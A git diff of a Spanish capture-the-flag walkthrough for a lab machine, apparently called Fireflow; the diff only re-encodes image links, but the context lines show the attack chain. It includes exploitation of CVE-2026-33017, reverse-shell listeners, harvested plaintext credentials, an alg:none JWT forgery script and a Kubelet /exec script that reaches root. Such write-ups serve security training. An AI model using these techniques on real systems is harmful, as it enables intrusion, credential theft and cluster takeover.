@@ -35,7 +35,7 @@ flowchart TD
 
 Comprobamos conectividad a la máquina:
 
-![Pasted image 20260811233810](../Images/Pasted_image_20260811233810.png)
+![Pasted image 20260811233810](../Images/Pasted%20image%2020260811233810.png)
 
 ### 2.2 Escaneo de puertos con Nmap
 
@@ -45,13 +45,13 @@ Realizamos el escaneo con Nmap:
 sudo nmap -Pn -sCVS -A -O 10.129.86.173 -v --reason -oN escaneo  
 ```
 
-![Pasted image 20260811234251](../Images/Pasted_image_20260811234251.png)
+![Pasted image 20260811234251](../Images/Pasted%20image%2020260811234251.png)
 
 ### 2.3 Resolución de nombres (/etc/hosts)
 
 Después se añade la entrada correspondiente al archivo `/etc/hosts`:
 
-![Pasted image 20260811234438](../Images/Pasted_image_20260811234438.png)
+![Pasted image 20260811234438](../Images/Pasted%20image%2020260811234438.png)
 
 ---
 
@@ -59,14 +59,14 @@ Después se añade la entrada correspondiente al archivo `/etc/hosts`:
 
 Al navegar por la web y presionar el botón `Open Agent`, no tenemos acceso debido a que no tenemos la resolución DNS de esa ruta.
 
-![Pasted image 20260811234808](../Images/Pasted_image_20260811234808.png)
-![Pasted image 20260811234821](../Images/Pasted_image_20260811234821.png)
-![Pasted image 20260811234910](../Images/Pasted_image_20260811234910.png)
+![Pasted image 20260811234808](../Images/Pasted%20image%2020260811234808.png)
+![Pasted image 20260811234821](../Images/Pasted%20image%2020260811234821.png)
+![Pasted image 20260811234910](../Images/Pasted%20image%2020260811234910.png)
 
 La aplicación es vulnerable a **CVE-2026-33017** ([Repository de referencia](https://github.com/EQSTLab/CVE-2026-33017.git)). Guardamos el payload JSON que define un componente personalizado con código Python malicioso:
 
-![Pasted image 20260811235626](../Images/Pasted_image_20260811235626.png)
-![Pasted image 20260812000030](../Images/Pasted_image_20260812000030.png)
+![Pasted image 20260811235626](../Images/Pasted%20image%2020260811235626.png)
+![Pasted image 20260812000030](../Images/Pasted%20image%2020260812000030.png)
 
 ```bash 
 curl -skv -X POST \
@@ -112,7 +112,7 @@ curl -skv -X POST \
 
 De aquí se extrae el `client_id`:
 
-![Pasted image 20260812001613](../Images/Pasted_image_20260812001613.png)
+![Pasted image 20260812001613](../Images/Pasted%20image%2020260812001613.png)
 
 En otra terminal ejecutamos el listener:
 
@@ -120,7 +120,7 @@ En otra terminal ejecutamos el listener:
 nc -lvnp 4444
 ```
 
-![Pasted image 20260812004444](../Images/Pasted_image_20260812004444.png)
+![Pasted image 20260812004444](../Images/Pasted%20image%2020260812004444.png)
 
 ---
 
@@ -128,12 +128,12 @@ nc -lvnp 4444
 
 Se guardan las credenciales encontradas en un archivo:
 
-![Pasted image 20260812004636](../Images/Pasted_image_20260812004636.png)
-![Pasted image 20260812004833](../Images/Pasted_image_20260812004833.png)
+![Pasted image 20260812004636](../Images/Pasted%20image%2020260812004636.png)
+![Pasted image 20260812004833](../Images/Pasted%20image%2020260812004833.png)
 
 Nos conectamos por SSH, y cuando nos pida las credenciales pasamos `LANGFLOW_SUPER_USER_PASSWORD`. Después de abierta la conexión capturamos la flag de usuario.
 
-![Pasted image 20260812005400](../Images/Pasted_image_20260812005400.png)
+![Pasted image 20260812005400](../Images/Pasted%20image%2020260812005400.png)
 
 Revisando el entorno del usuario, inspeccionamos las configuraciones de MCP:
 
@@ -141,7 +141,7 @@ Revisando el entorno del usuario, inspeccionamos las configuraciones de MCP:
 cat ~/.mcp/config.json
 ```
 
-![Pasted image 20260812005738](../Images/Pasted_image_20260812005738.png)
+![Pasted image 20260812005738](../Images/Pasted%20image%2020260812005738.png)
 
 Y se guardan en el archivo de credenciales, luego se usan.
 
@@ -155,7 +155,7 @@ Ejecución de autenticación en la API de Fireflow:
 curl -s -X POST http://10.129.244.214:30080/api/v1/auth -H 'Content-Type: application/json' -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}'
 ```
 
-![Pasted image 20260812010521](../Images/Pasted_image_20260812010521.png)
+![Pasted image 20260812010521](../Images/Pasted%20image%2020260812010521.png)
 
 Analizamos el token JWT obtenido:
 
@@ -163,7 +163,7 @@ Analizamos el token JWT obtenido:
 echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps" | cut -d. -f2 | base64 -d 2>/dev/null 
 ```
 
-![Pasted image 20260812011050](../Images/Pasted_image_20260812011050.png)
+![Pasted image 20260812011050](../Images/Pasted%20image%2020260812011050.png)
 
 Obtenemos el token directamente usando Python:
 
@@ -173,7 +173,7 @@ curl -s -X POST http://10.129.86.173:30080/api/v1/auth \
   -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | python3 -c "import sys, json; print(json.load(sys.stdin)['access_token'])"
 ```
 
-![Captura de pantalla 2026-08-12 011616](../Images/Captura_de_pantalla_2026-08-12_011616.png)
+![Captura de pantalla 2026-08-12 011616](../Images/Captura%20de%20pantalla%202026-08-12%20011616.png)
 
 Escribimos un script para **forjar un JWT** cambiando el `role` a `admin` y usando `alg: none`, es decir, un intento de bypass de autenticación (`craft.py`):
 
@@ -196,7 +196,7 @@ token = f"{header}.{payload}."
 print(f"Token generado:\n{token}\n")
 ```
 
-![Pasted image 20260813180603](../Images/Pasted_image_20260813180603.png)
+![Pasted image 20260813180603](../Images/Pasted%20image%2020260813180603.png)
 
 Ejecución de payload para la shell; en la otra terminal ejecutamos `nc -lvnp 9001`:
 
@@ -217,7 +217,7 @@ nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/mcp \         
 {"jsonrpc":"2.0","id":4,"result":{"content":[{"type":"text","text":""}],"isError":false}}
 ```
 
-![Pasted image 20260813182916](../Images/Pasted_image_20260813182916.png)
+![Pasted image 20260813182916](../Images/Pasted%20image%2020260813182916.png)
 
 ---
 
@@ -225,7 +225,7 @@ nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/mcp \         
 
 Comandos en la máquina: definir las variables para los scripts.
 
-![Pasted image 20260813222159](../Images/Pasted_image_20260813222159.png)
+![Pasted image 20260813222159](../Images/Pasted%20image%2020260813222159.png)
 
 Verificamos los permisos de nuestra ServiceAccount en la API de Kubernetes:
 
@@ -248,7 +248,7 @@ for rule in data.get("status", {}).get("resourceRules", []):
 '
 ```
 
-![Pasted image 20260813222222](../Images/Pasted_image_20260813222222.png)
+![Pasted image 20260813222222](../Images/Pasted%20image%2020260813222222.png)
 
 Enumeramos los pods en el clúster consultando el endpoint de la API Kubelet para identificar pods privilegiados con montajes de rutas del host (`hostPath`):
 
@@ -268,7 +268,7 @@ for item in data.get('items', []):
 "
 ```
 
-![Pasted image 20260813223459](../Images/Pasted_image_20260813223459.png)
+![Pasted image 20260813223459](../Images/Pasted%20image%2020260813223459.png)
 
 Creamos un script `Kube_exec.py` para interactuar con el endpoint `/exec` de Kubelet a través de WebSockets:
 
@@ -310,11 +310,11 @@ async def ws_exec(cmd_parts):
 asyncio.run(ws_exec(COMMAND.split()))
 ```
 
-![Pasted image 20260813222841](../Images/Pasted_image_20260813222841.png)
+![Pasted image 20260813222841](../Images/Pasted%20image%2020260813222841.png)
 
 Ejecutamos el exploit, obtenemos acceso root en el contenedor privilegiado y capturamos la flag final.
 
-![Pasted image 20260813223955](../Images/Pasted_image_20260813223955.png)
+![Pasted image 20260813223955](../Images/Pasted%20image%2020260813223955.png)
 ![Fireflow](../Certficados/Fireflow.png)
 
 ---
